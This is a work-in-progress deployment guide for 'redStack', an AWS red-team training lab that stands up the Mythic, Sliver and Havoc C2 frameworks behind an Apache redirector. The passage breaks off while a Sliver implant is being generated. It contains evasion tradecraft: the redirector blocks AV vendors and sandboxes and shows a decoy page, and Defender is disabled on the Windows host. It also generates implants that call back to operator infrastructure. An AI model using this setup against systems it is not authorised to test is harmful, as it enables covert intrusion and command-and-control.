# redStack: A Boot-to-Breach Lab Environment for Red Team Operations

> [!WARNING]
> This is still very much in development! Please excuse the mess while I continue to get this to a more stable release version.

## Complete Deployment Walkthrough

**Purpose:** Step-by-step guide to deploy and verify your boot-to-breach lab environment
**Difficulty:** Intermediate to Advanced

---

## Table of Contents

- [Architecture Overview](#architecture-overview)
- [Pre-Deployment Checklist](#pre-deployment-checklist)
- [Part 1: Initial Deployment](#part-1-initial-deployment)
- [Part 2: Verification](#part-2-verification)
- [Part 3: Apache Redirector Configuration](#part-3-apache-redirector-configuration)
- [Part 4: Mythic C2 Setup](#part-4-mythic-c2-setup)
- [Part 5: Sliver C2 Setup](#part-5-sliver-c2-setup)
- [Part 6: Havoc C2 Setup](#part-6-havoc-c2-setup)
- [Part 7: Final Validation](#part-7-final-validation)
- [Part 8: External Target Environments (HTB/THM/ProvingGrounds)](#part-8-external-target-environments-htbthmprovinggrounds)
- [Troubleshooting](#troubleshooting)

---

## Architecture Overview

```text
+---------------------------------------------------------------------+
|                     NETWORK ARCHITECTURE                            |
+---------------------------------------------------------------------+

VPC A - Team Server Infrastructure (10.50.0.0/16 or Default VPC)
├── mythic       - Mythic Team Server     (Debian 12 - internal only, no public IP)
├── sliver       - Sliver C2 Server       (Debian 12 - internal only, no public IP)
├── havoc        - Havoc C2 Server        (Debian 12 - internal only, no public IP)
├── guac         - Guacamole Server       (Debian 12 - Elastic IP, public facing)
└── WIN-OPERATOR - Windows Workstation    (Windows Server 2022 - internal only, RDP via Guacamole)

VPC B - Redirector Infrastructure (10.60.0.0/16)
└── redirector   - Apache Redirector      (Debian 12 - Elastic IP, public facing)

VPC Peering: VPC A ←→ VPC B

Traffic Flow (Header + URI Validation - ports 80/443):
[Target] → /cdn/media/stream/    → Redirector → Mythic
[Target] → /cloud/storage/objects/ → Redirector → Sliver
[Target] → /edge/cache/assets/   → Redirector → Havoc
Required: X-Request-ID: <auto-generated-token>
No header: Decoy page (CloudEdge CDN maintenance)

Security Posture:
✓ ALL C2 servers have NO public IPs (internal only)
✓ Full internal mesh - all lab machines can reach each other (ping/SSH/any)
✓ Redirector in separate VPC (simulates external provider isolation)
✓ Header validation (X-Request-ID + token) required for C2 proxy
✓ URI prefix routing with CDN/cloud-style paths
✓ redirect.rules: AV vendors, TOR exits blocked (403); cloud IPs commented out for AWS compatibility
✓ Decoy page served to requests without valid C2 header
✓ All hosts have descriptive hostnames and /etc/hosts entries for name resolution
```

> **Tip:** After deployment, run `terraform output network_architecture` to see this diagram populated with your actual IP addresses.

---

## Pre-Deployment Checklist

### Prerequisites

- [ ] AWS account with IAM credentials
- [ ] AWS CLI installed and configured
- [ ] Terraform >= 1.0 installed
- [ ] Your public IP obtained
- [ ] SSH key pair created in AWS EC2 (see Step 0.3 below)
- [ ] redstack_tf package extracted

### Step 0.1: Install AWS CLI & Terraform

**Install AWS CLI:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install awscli` |
| Linux (Ubuntu/Debian) | `sudo apt install awscli` |
| Linux (any) | `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install` |
| Windows | Download and run the MSI installer from <https://aws.amazon.com/cli/> |

**Configure AWS CLI:**

```bash
aws configure
```

You will be prompted for:

- **AWS Access Key ID** - from IAM Console → Users → Security credentials
- **AWS Secret Access Key** - shown once when creating the access key
- **Default region name** - `us-east-1` (or your preferred region)
- **Default output format** - `json`

> **Note:** If you don't have an access key yet, create one in the AWS Console:
> IAM → Users → [your user] → Security credentials → Create access key → CLI use case

**Install Terraform:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install terraform` |
| Linux (Ubuntu/Debian) | See <https://developer.hashicorp.com/terraform/install> |
| Windows | `choco install terraform` or download from <https://developer.hashicorp.com/terraform/install> |

**Checkpoint:** ✅ AWS CLI and Terraform installed

### Step 0.2: Verification Commands

**Windows (PowerShell):**

```powershell
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
(Invoke-WebRequest -Uri "https://ifconfig.me" -UseBasicParsing).Content.Trim()
```

**Linux/Mac (bash):**

```bash
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
curl -s ifconfig.me
```

**Expected Results:**

- AWS CLI returns your account details (Account, Arn, UserId)
- Terraform version 1.0 or higher
- Public IP address displayed

**Checkpoint:** ✅ AWS CLI and Terraform working, public IP noted

### Step 0.3: Create AWS SSH Key Pair (Required)

**Terraform does NOT create the SSH key pair - you must create it manually first.**

### Option 1: AWS Console (Recommended)

1. Open AWS Console → EC2 → Key Pairs
2. Click "Create key pair"
3. Name: `rs-rsa-key` (or your preferred name)
4. Key type: RSA
5. File format: `.pem` (for Linux/Mac/Windows OpenSSH)
6. Click "Create key pair"
7. **Save the downloaded .pem file** - you cannot download it again!
8. Move to project folder and set permissions:

**Windows (PowerShell):**

```powershell
# Move key to project folder (adjust path as needed)
Move-Item "$env:USERPROFILE\Downloads\rs-rsa-key.pem" ".\rs-rsa-key.pem"

# Fix permissions (required — OpenSSH rejects keys with open permissions)
icacls ".\rs-rsa-key.pem" /inheritance:r /grant:r "$($env:USERNAME):R"
```

**Linux/Mac (bash):**

```bash
mv ~/Downloads/rs-rsa-key.pem ./
chmod 400 ./rs-rsa-key.pem
```

### Option 2: AWS CLI

**Linux/Mac (bash):**

```bash
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text > ./rs-rsa-key.pem
chmod 400 ./rs-rsa-key.pem
```

**Windows (PowerShell):**

```powershell
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text | Out-File -Encoding ascii rs-rsa-key.pem
icacls "rs-rsa-key.pem" /inheritance:r /grant:r "$($env:USERNAME):R"
```

**Verify key pair exists:**

```bash
aws ec2 describe-key-pairs --key-names rs-rsa-key
```

**Checkpoint:** ✅ SSH key pair created and .pem file saved

---

## Part 1: Initial Deployment

### Objective: AWS Infrastructure Deployment

Deploy all AWS infrastructure using Terraform: VPCs, security groups, EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Apache redirector).

### Step 1.1: Configure Terraform Variables

```bash
cd redstack_tf
cp terraform.tfvars.example terraform.tfvars
nano terraform.tfvars   # Linux/Mac
notepad terraform.tfvars  # Windows
```

**Required Changes:**

```hcl
localPub_ip              = "YOUR_IP/32"           # Replace with your IP + /32
ssh_key_name             = "rs-rsa-key"            # Must match your AWS key pair name
ssh_private_key_path     = "./rs-rsa-key.pem"      # Path to your .pem file (for Windows password decryption)
redirector_domain        = "yourdomain.tld"        # Your domain — apex or subdomain (see Step 1.6)
enable_external_vpn      = false                   # Set to true for HTB/THM/ProvingGrounds access (see Part 8)
```

**Note:** Passwords are auto-generated during deployment. A single random password is used for SSH and Guacamole admin access. The Windows Administrator password is generated by AWS and decrypted automatically using your SSH private key. Retrieve credentials after deployment with:

```bash
terraform output deployment_info
```

**Checkpoint:** ✅ File saved with your actual values

### Step 1.2: Initialize Terraform

```bash
terraform init
```

**Expected Output:**

```text
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 5.0"...
- Installing hashicorp/aws v5.x.x...
Terraform has been successfully initialized!
```

**Checkpoint:** ✅ No errors, providers downloaded

### Step 1.3: Review Deployment Plan

```bash
terraform plan
```

**Expected Output:**

- **~50+ resources** to be created
- 6 EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Redirector)
- 2 VPCs (team server VPC + redirector VPC)
- 2 Elastic IPs (Guacamole, Redirector) - **static, persistent IPs**
- Mythic, Sliver, and Havoc have **no public IPs** (internal only)
- Security groups, VPC peering, route tables
- No errors or warnings

**Checkpoint:** ✅ Plan shows expected resources

### Step 1.4: Deploy Infrastructure

```bash
terraform apply
```

Type `yes` when prompted.

**Expected Output:**

```text
Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
```

**Checkpoint:** ✅ Terraform apply completed successfully

### Step 1.5: Save Deployment Information

```bash
terraform output deployment_info
terraform output network_architecture
```

> **Note:** There are two outputs: `deployment_info` (all IPs, credentials, SSH commands) and `network_architecture` (diagram with actual IPs). All connection details you need for the rest of this guide are in `deployment_info`. Save it to a file:
>
> **Windows (PowerShell):**
>
> ```powershell
> terraform output deployment_info | Out-File -Encoding utf8 deployment_info.txt
> ```
>
> **Linux/Mac (bash):**
>
> ```bash
> terraform output deployment_info > deployment_info.txt
> ```

**Checkpoint:** ✅ Output saved, network diagram displayed

### Step 1.6: Point Domain to Redirector

After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.

**Get the Redirector IP:**

```bash
terraform output deployment_info
```

Look for the **APACHE REDIRECTOR** section — the `Public IP` field is what you need.

**Create a DNS A Record:**

1. Log into your domain registrar or DNS provider (e.g., Namecheap, Cloudflare, Route53)
2. Navigate to DNS settings for your domain
3. Create an **A record** pointing to the redirector's Elastic IP:

| Domain type | Host/Name field | Example |
| ----------- | --------------- | ------- |
| Apex domain | `@` | `yourdomain.tld` → redirector IP |
| Subdomain | subdomain only (e.g., `sub`) | `sub.yourdomain.tld` → redirector IP |

- **Value/Points to:** The redirector's Elastic IP from the command above
- **TTL:** 300 (5 minutes) or lowest available

**Verify DNS Propagation** (substitute your actual `redirector_domain` value from `terraform.tfvars`):

**Windows (PowerShell):**

```powershell
Resolve-DnsName yourdomain.tld
```

**Linux/Mac (bash):**

```bash
dig +short yourdomain.tld
```

**Expected:** The IP returned should match your redirector's Elastic IP.

> **Note:** DNS propagation can vary. After DNS resolves correctly, run Certbot on the redirector (see Step 2.4):
>
> ```bash
> sudo certbot --apache -d yourdomain.tld
> ```

**Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified

### Wait Time: 5-10 Minutes

**Why:** User data scripts are installing software on multiple servers

**What's Happening:**

- All hosts: Setting descriptive hostnames and populating /etc/hosts for cross-host name resolution
- Mythic (`mythic`): Installing Docker, cloning Mythic, starting ~10 containers (Debian 12)
- Sliver (`sliver`): Installing Sliver C2 server binary, configuring firewall (Debian 12)
- Havoc (`havoc`): Installing Go, cloning and building Havoc teamserver from source (Debian 12)
- Guacamole (`guac`): Setting up PostgreSQL, Nginx, Docker containers (Debian 12)
- Windows (`WIN-OPERATOR`): Disabling Defender/Firewall, enabling RDP, installing tools (Chromium, VS Code, MobaXterm, 7-Zip)
- Redirector (`redirector`): Installing Apache with mod_rewrite/proxy, configuring header+URI validation, downloading redirect.rules, setting up SSL and decoy page (Debian 12, fully automated)

---

## Part 2: Verification

### Objective: Component Verification

Verify all six components are operational and accessible.

> **Getting Connection Details:** All IPs and credentials for the steps below come from:
>
> ```bash
> terraform output deployment_info
> ```
>
> Run this from your project directory and note the IPs for each component. For subsequent SSH commands, substitute the actual IPs shown in the output.
>
> **Windows (PowerShell) — set variables for use in this session:**
>
> ```powershell
> $GUAC_IP   = "x.x.x.x"   # GUACAMOLE Public IP from deployment_info
> $REDIR_IP  = "x.x.x.x"   # APACHE REDIRECTOR Public IP from deployment_info
> $MYTHIC_IP = "x.x.x.x"   # MYTHIC Private IP from deployment_info
> $SLIVER_IP = "x.x.x.x"   # SLIVER Private IP from deployment_info
> $HAVOC_IP  = "x.x.x.x"   # HAVOC Private IP from deployment_info
> ```
>
> **Linux/Mac (bash) — set variables for use in this session:**
>
> ```bash
> GUAC_IP="x.x.x.x"    # GUACAMOLE Public IP from deployment_info
> REDIR_IP="x.x.x.x"   # APACHE REDIRECTOR Public IP from deployment_info
> MYTHIC_IP="x.x.x.x"  # MYTHIC Private IP from deployment_info
> SLIVER_IP="x.x.x.x"  # SLIVER Private IP from deployment_info
> HAVOC_IP="x.x.x.x"   # HAVOC Private IP from deployment_info
> ```
>
> **Pre-configured hostnames (usable from any machine inside the lab):**
>
> | Hostname | Resolves To | Access |
> | -------- | ----------- | ------ |
> | `mythic` | Mythic private IP | `https://mythic:7443` — Login: `mythic_admin` |
> | `sliver` | Sliver private IP | SSH / gRPC port 31337 |
> | `havoc` | Havoc private IP | Havoc client — `havoc:40056` — Login: `operator` / `Training123!` |
> | `guac` | Guacamole private IP | Internal ping/SSH only — access Guacamole via its public EIP |
> | `redirector` | Redirector private IP | SSH / Apache proxy |
> | `win-operator` | Windows private IP | RDP via Guacamole |
>
> These entries are pre-written to `/etc/hosts` on all Linux machines and `C:\Windows\System32\drivers\etc\hosts` on the Windows workstation during deployment. Use hostnames instead of IPs for all internal web panels and connections.

### Step 2.1: Verify Mythic Team Server

Mythic is internal only (no public IP). Access it via Guacamole SSH or from another instance in the C2 VPC (VPC A).

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Mythic C2 Server (SSH)"**
3. Should connect automatically

**Or via direct SSH (instructor only, from your machine):**

**Windows (PowerShell):**

```powershell
ssh -i ".\rs-rsa-key.pem" admin@$MYTHIC_IP
```

**Linux/Mac (bash):**

```bash
ssh -i rs-rsa-key.pem admin@$MYTHIC_IP
```

**Check Mythic Status:**

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

**Expected Output:**

```text
Mythic Main Services
CONTAINER NAME        STATE    STATUS
mythic_documentation  running  Up X minutes (healthy)
mythic_graphql        running  Up X minutes (healthy)
mythic_jupyter        running  Up X minutes (healthy)
mythic_nginx          running  Up X minutes (healthy)
mythic_postgres       running  Up X minutes (healthy)
mythic_rabbitmq       running  Up X minutes (healthy)
mythic_react          running  Up X minutes (healthy)
mythic_server         running  Up X minutes (healthy)

Installed Services
CONTAINER NAME  STATE    STATUS
apollo          running  Up X minutes
http            running  Up X minutes
```

All 8 core containers + apollo agent + http C2 profile = 10 total. The warnings about localhost binding are expected and not a problem — they only apply if running remote services on separate machines.

**Get Admin Password:**

```bash
sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD
```

**Checkpoint:** ✅ 8+ containers running, password obtained

**Access Web UI (via Windows workstation or Guacamole):**

The Mythic Web UI is only accessible from within the C2 VPC (VPC A). Use the Windows operator workstation (via Guacamole RDP) to open a browser and navigate to:

```text
https://mythic:7443
```

> **Tip:** All lab machines have pre-configured `/etc/hosts` (Linux) and `C:\Windows\System32\drivers\etc\hosts` (Windows) entries for every other machine. You can use hostnames (`mythic`, `sliver`, `havoc`, `guac`, `redirector`, `win-operator`) instead of private IPs from any machine in the lab.

- Login: `mythic_admin`
- Password: from command above

**Checkpoint:** ✅ Mythic UI accessible, can login

### Step 2.2: Verify Guacamole Access Portal

**SSH to Guacamole:**

**Windows (PowerShell):**

```powershell
ssh -i ".\rs-rsa-key.pem" admin@$GUAC_IP
```

**Linux/Mac (bash):**

```bash
ssh -i rs-rsa-key.pem admin@$GUAC_IP
```

**Check Docker Containers:**

```bash
docker ps
```

**Expected Output:**

```text
CONTAINER ID   IMAGE                   STATUS
xxxxx          guacamole/guacamole     Up X minutes
xxxxx          postgres:15             Up X minutes
xxxxx          guacamole/guacd         Up X minutes
```

**Checkpoint:** ✅ 3 containers running

```bash
exit  # Exit SSH
```

**Access Guacamole UI:**

Open in your browser:

```text
https://<GUAC_PUBLIC_IP>/guacamole
```

**Login Credentials:**

- Username: `guacadmin`
- Password: from `terraform output deployment_info` (look for the Guacamole section)

**Checkpoint:** ✅ Guacamole UI accessible, can login

**Verify Auto-Created Connections:**

After logging in, you should see **6 pre-configured connections**:

1. **Windows Operator Workstation** (RDP) - auto-connects with Administrator credentials
2. **Mythic C2 Server (SSH)** - green-black terminal theme
3. **Guacamole Server (SSH)** - green-black terminal theme
4. **Apache Redirector (SSH)** - green-black terminal theme
5. **Sliver C2 Server (SSH)** - green-black terminal theme
6. **Havoc C2 Server (SSH)** - green-black terminal theme

All SSH connections use password authentication (no SSH keys needed) and are pre-configured with the auto-generated lab password. The Windows RDP connection uses the default AWS `Administrator` account with an auto-decrypted password (no manual entry needed).

**Checkpoint:** ✅ All 6 connections visible in Guacamole UI

### Step 2.3: Verify Windows Operator Workstation

The Windows instance uses the default AWS `Administrator` account. The password is automatically generated by AWS, decrypted by Terraform using your SSH private key, and passed to the Guacamole RDP connection.

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Windows Operator Workstation"**
3. RDP connects automatically (credentials are pre-configured)
4. Wait 10-30 seconds for RDP connection

**Expected:**

- Windows desktop loads
- Logged in as `Administrator` (local admin)
- Chromium, VS Code, MobaXterm, and 7-Zip installed

**Checkpoint:** ✅ Can RDP into Windows via Guacamole, tools available

**If Connection Fails:**

- Wait 5 more minutes (Windows setup is slowest)
- Check instance state in AWS Console → EC2 → Instances → WIN-OPERATOR → should show `running`

### Step 2.4: Verify Apache Redirector

The redirector is **fully automated** — Apache, header validation, URI routing, redirect.rules, the decoy page, and SSL are all configured during deployment. No manual setup is needed beyond SSL certificate issuance (below).

**SSH to Redirector:**

**Windows (PowerShell):**

```powershell
ssh -i ".\rs-rsa-key.pem" admin@$REDIR_IP
```

**Linux/Mac (bash):**

```bash
ssh -i rs-rsa-key.pem admin@$REDIR_IP
```

**What's Pre-Configured:**

- Apache2 with modules: rewrite, ssl, proxy, proxy_http, headers, deflate
- Header validation (`X-Request-ID` + auto-generated token) — requests without the correct header get a decoy page
- URI prefix routing to each C2 server (CDN/cloud-style paths)
- [redirect.rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10) (adapted) — blocks AV vendors, cloud sandboxes, TOR exit nodes (403 Forbidden)
- CloudEdge CDN maintenance decoy page (served when header validation fails)
- Self-signed SSL certificate (placeholder until Certbot is configured)
- UFW firewall (ports 22, 80, 443)
- Certbot installed and ready for Let's Encrypt

**URI Routing (configured automatically, all on ports 80/443):**

| URI Prefix | Backend C2 Server |
| ---------- | ----------------- |
| `/cdn/media/stream/` | Mythic |
| `/cloud/storage/objects/` | Sliver |
| `/edge/cache/assets/` | Havoc |

**Header Validation:**

All C2 traffic must include the correct header to pass through the redirector:

```bash
# Get the required header from terraform output (run from your local machine)
terraform output deployment_info
# Look for: C2 Header: X-Request-ID: <token>
```

Requests without the header (or with the wrong value) receive the decoy page instead of being proxied.

> **Important — redirect.rules Download:** The redirector downloads `redirect.rules` at boot from the redStack GitHub repo. If the repo is **private**, this download will silently fail and Apache will fail to start. See [redirect.rules Download Fails](#redirectrules-download-fails-private-repo) in Troubleshooting for the fix.

**Run Connectivity Test:**

A test script is pre-installed on the redirector:

```bash
sudo /root/test_redirector.sh
```

This tests Apache status, VirtualHost configuration, connectivity to all three C2 backend servers, and the header/decoy page behavior.

**Verify redirect.rules:**

```bash
# Check how many blocking rules are installed
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

The redirect.rules file blocks known security scanners, AV vendor IPs, and TOR exit nodes with 403 Forbidden. Note: `curl` is in the blocked user-agent list, so manual testing must use a browser-like User-Agent (the test script handles this automatically).

> **Note:** AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. Blocking cloud subnets would prevent C2 callbacks from reaching the redirector. If you deploy outside of cloud environments, you can re-enable them:
>
> ```bash
> sudo nano /etc/apache2/redirect.rules
> # Uncomment: "Class A Exclusions", "AWS Fine Grained", "Azure", "Other VT hosts"
> sudo systemctl reload apache2
> ```

**Checkpoint:** ✅ Apache running, header+URI validation active, redirect.rules blocking scanners

**Obtain SSL Certificate (after DNS is pointed):**

```bash
sudo certbot --apache -d yourdomain.tld
```

Follow the prompts. Certbot will automatically update the Apache HTTPS config and add an HTTP→HTTPS redirect. Auto-renewal is configured by Certbot.

```bash
exit  # Exit SSH
```

### Step 2.5: Verify Sliver C2 Server

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Sliver C2 Server (SSH)"**
3. Should connect automatically

**Or via direct SSH (from your machine):**

> **Note:** Sliver and other internal servers have no public IP. SSH to them directly only works if you're in the C2 VPC (VPC A), or via the redirector as a jump host.

**Verify Sliver is installed:**

```bash
which sliver-server
```

**Checkpoint:** ✅ Sliver C2 server installed, accessible via Guacamole

### Step 2.6: Verify Havoc C2 Server

**Access via Guacamole:**

1. Open Guacamole UI
2. Click **"Havoc C2 Server (SSH)"**
3. Should connect automatically

**Run Quick Start:**

```bash
sudo /root/havoc_quickstart.sh
```

**Start the Havoc Teamserver:**

```bash
sudo systemctl start havoc
sudo systemctl status havoc
```

**Checkpoint:** ✅ Havoc C2 teamserver running, accessible via Guacamole

### Step 2.7: Verify SSH Connections via Guacamole

**Test SSH Access:**

1. Open Guacamole UI
2. Click **"Mythic C2 Server (SSH)"**
3. Should connect without prompting for credentials
4. Prompt should show `admin@mythic:~$`
5. Run: `whoami` → Should show `admin`
6. Run: `ping sliver` → Should resolve to Sliver's private IP (verifies /etc/hosts)
7. Disconnect

**Repeat for:**

- **"Guacamole Server (SSH)"** → prompt: `admin@guac:~$`
- **"Apache Redirector (SSH)"** → prompt: `admin@redirector:~$`
- **"Sliver C2 Server (SSH)"** → prompt: `admin@sliver:~$`
- **"Havoc C2 Server (SSH)"** → prompt: `admin@havoc:~$`

**Checkpoint:** ✅ All SSH connections work via Guacamole

**Verify SSH Security:**

All Linux servers (Debian 12, SSH user: `admin`) are configured with dual SSH authentication:

- **From Public IPs:** SSH keys REQUIRED (password authentication disabled)
- **From C2 VPC IPs (10.50.0.0/16, 172.31.0.0/16):** Password authentication ALLOWED

This means:

- ✅ Guacamole can SSH with passwords (it's in the C2 VPC)
- ✅ Your SSH key still works from your public IP
- ❌ Random internet users cannot brute-force SSH passwords

**Checkpoint:** ✅ Understand SSH security model

---

## Part 3: Apache Redirector Configuration

### Objective: Understand Redirector Security Layers

The redirector is pre-configured with multiple security layers. This section explains how they work and how to customize them.

### Step 3.1: Review Configuration

**SSH to redirector** (substitute your actual redirector IP):

```bash
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>
```

**View Active VirtualHosts:**

```bash
sudo apache2ctl -S
```

This shows all configured VirtualHosts (HTTP and HTTPS on ports 80/443).

**View HTTP Config (all C2 routes in one file):**

```bash
sudo cat /etc/apache2/sites-available/redirector-http.conf
```

**View HTTPS Config:**

```bash
sudo cat /etc/apache2/sites-available/redirector-https.conf
```

Each VirtualHost uses three security layers before proxying traffic:

1. **redirect.rules** — Blocks known AV vendors, cloud sandboxes, security scanners, and TOR exit nodes (returns 403)
2. **Header validation** — Requires `X-Request-ID` header with a specific token value
3. **URI prefix routing** — Only matching URI prefixes are proxied to C2 backends

**Checkpoint:** ✅ Understand the three-layer security model

### Step 3.2: Security Layer Details

#### Layer 1: redirect.rules (Automated Scanner Blocking)

The file `/etc/apache2/redirect.rules` is downloaded at boot from the [redStack GitHub repo](https://github.com/BaddKharma/redStack), which maintains an adapted version of [curi0usJack's redirect rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10):

- All `302` redirects replaced with `403 Forbidden` responses
- Setup directives stripped (`Define REDIR_TARGET`, `RewriteEngine On`, `RewriteOptions Inherit`)
- AWS/Azure/cloud IP blocks **commented out** (would block our own AWS-hosted C2 callbacks)
- Included in both HTTP and HTTPS VirtualHosts via `Include /etc/apache2/redirect.rules`

> **Note:** If the redStack repo is private, the download will silently fail and Apache will fail to start. See [redirect.rules Download Fails](#redirectrules-download-fails-private-repo) in Troubleshooting.

```bash
# Check installed rules
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

To update redirect.rules manually:

```bash
# Re-download from redStack repo (only works if repo is public)
curl -sL "https://raw.githubusercontent.com/BaddKharma/redStack/main/setup_scripts/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo systemctl reload apache2
```

### Layer 2: Header Validation

Requests must include the correct `X-Request-ID` header. Without it, Apache serves the CloudEdge CDN decoy page instead of proxying to C2 backends.

Get the required header value from your local machine:

```bash
terraform output deployment_info
# Look for: C2 Header: X-Request-ID: <token>
```

### Layer 3: URI Prefix Routing

| URI Prefix | Backend | Example |
| ---------- | ------- | ------- |
| `/cdn/media/stream/` | Mythic | `/cdn/media/stream/callback` → Mythic `/callback` |
| `/cloud/storage/objects/` | Sliver | `/cloud/storage/objects/session` → Sliver `/session` |
| `/edge/cache/assets/` | Havoc | `/edge/cache/assets/beacon` → Havoc `/beacon` |

The URI prefix is stripped before forwarding to the backend C2 server.

**Checkpoint:** ✅ Understand header validation, URI routing, and scanner blocking

### Step 3.3: Test the Security Layers

> **Important:** `curl` is blocked by redirect.rules (it's in the suspicious User-Agent list). All manual tests must use a browser-like User-Agent with `-A`.

```bash
# Set a browser User-Agent for testing
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADER_VALUE="<token from terraform output deployment_info>"

# Should get DECOY PAGE (no header)
curl -sk -A "$UA" https://<YOUR_DOMAIN>/

# Should get DECOY PAGE (wrong header value)
curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://<YOUR_DOMAIN>/cdn/media/stream/test

# Should be PROXIED to Mythic (connection refused/timeout if no listener running yet — that's expected)
curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://<YOUR_DOMAIN>/cdn/media/stream/test
```

**Checkpoint:** ✅ Security layers verified

### Step 3.4: Review Logs

All C2 traffic is logged to separate access/error log files:

```bash
# SSH to redirector first
ssh -i rs-rsa-key.pem admin@<REDIR_PUBLIC_IP>

# HTTP access log
sudo tail -50 /var/log/apache2/redirector-access.log
sudo tail -50 /var/log/apache2/redirector-error.log

# HTTPS access log
sudo tail -50 /var/log/apache2/redirector-ssl-access.log
sudo tail -50 /var/log/apache2/redirector-ssl-error.log
```

**Checkpoint:** ✅ Redirector logging understood

---

## Part 4: Mythic C2 Setup

### Objective: Mythic Listener and Agent Generation

Configure Mythic HTTP listener and generate test agent.

### Step 4.0: Verify Pre-Installed Profiles and Agents

The HTTP C2 profile and Apollo agent are installed automatically by the setup script. Verify they are present before proceeding:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

Look for `apollo` and `http` under **Installed Services** — both should show `running`.

**If either is missing, install manually:**

```bash
cd /opt/Mythic
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo

# Restart to load new components
sudo ./mythic-cli stop
sleep 10
sudo ./mythic-cli start
```

**Checkpoint:** ✅ `apollo` and `http` both running under Installed Services

### Step 4.1: Start HTTP Listener

The HTTP C2 profile is already installed (verified in Step 4.0). You just need to start a listener instance on it.

**Access Mythic UI (from Windows workstation via Guacamole RDP):**

```text
https://mythic:7443
```

- Login: `mythic_admin`
- Password: `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD` (run on Mythic server)

**Navigate:** C2 Profiles → HTTP → click the **Start** icon (or "New Instance" if no listener is running yet)

**Configuration:**

| Setting | Value |
| ------- | ----- |
| Callback Host | Your redirector's domain or public IP |
| Callback Port | `443` |
| Callback Interval | `10` |
| Callback Jitter | `20` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` |
| GET URI | `/cdn/media/stream/status` |
| POST URI | `/cdn/media/stream/update` |
| Headers | `X-Request-ID: <token from terraform output deployment_info>` |

**Click:** "Submit" then "Start"

**Checkpoint:** ✅ Listener shows "Running"

### Step 4.2: Generate Agent

**Navigate:** Payloads → Generate New

**Configuration:**

| Setting | Value |
| ------- | ----- |
| Agent | `Apollo` |
| C2 Profile | Select your HTTP listener |
| Commands | Select: `shell`, `download`, `upload`, `screenshot` |
| Operating System | `Windows` |
| Output Format | `Windows Executable (.exe)` |

**Click:** "Generate"

**Wait:** 30-60 seconds

**Download:** Click "Download" button

**Checkpoint:** ✅ Agent downloaded (filename like `apollo.exe`)

### Step 4.3: Deploy Agent

**Access Windows Workstation:**

1. Open Guacamole UI
2. Click "Windows Operator Workstation"
3. Use file transfer to upload `apollo.exe`

**Or use Guacamole's file share:**

- Left sidebar → Devices → Shared Drive
- Copy agent to shared folder

**Execute Agent:**

```powershell
cd Downloads  # Or wherever you uploaded
.\apollo.exe
```

**Watch Mythic UI:**

- Navigate to: Active Callbacks
- Should see new callback appear within ~10 seconds

**Expected:**

```text
Hostname: WIN-OPERATOR
User: Administrator
IP: 172.31.X.X
```

**Checkpoint:** ✅ Agent callback received

### Step 4.4: Test C2 Session

**In Mythic, click the callback**

**Test Commands:**

```text
Task: shell
Command: whoami
```

**Expected Output:** `win-operator\administrator`

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Look for:** Regular GET/POST requests to `/cdn/media/stream/status` and `/cdn/media/stream/update`

**Checkpoint:** ✅ C2 traffic flowing through redirector to Mythic

---

## Part 5: Sliver C2 Setup

### Objective: Sliver Operator and Listener Setup

Configure Sliver C2 server, generate an operator config, and create a listener.

### Step 5.1: Access Sliver Server

**Via Guacamole:** Click **"Sliver C2 Server (SSH)"**

**Or via direct SSH from your machine** (substitute your actual Sliver private IP from `terraform output deployment_info`):

```bash
# Sliver has no public IP — SSH via the redirector as a jump host
ssh -i rs-rsa-key.pem -J admin@<REDIR_PUBLIC_IP> admin@sliver
```

### Step 5.2: Generate Operator Config

```bash
sudo /root/generate_operator_config.sh operator1
```

This creates `/root/operator1.cfg` — transfer this file to your machine to connect using the Sliver client.

**Checkpoint:** ✅ Operator config generated

### Step 5.3: Start Sliver Console and Create Listener

```bash
sliver-server
```

**In the Sliver console:**

```text
sliver > http --lhost 0.0.0.0 --lport 80
```

This starts an HTTP listener on port 80. The redirector forwards traffic from the `/cloud/storage/objects/` URI prefix to this listener.

**Checkpoint:** ✅ Sliver HTTP listener running

### Step 5.4: Generate Implant

**In the Sliver console:**

```text
sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

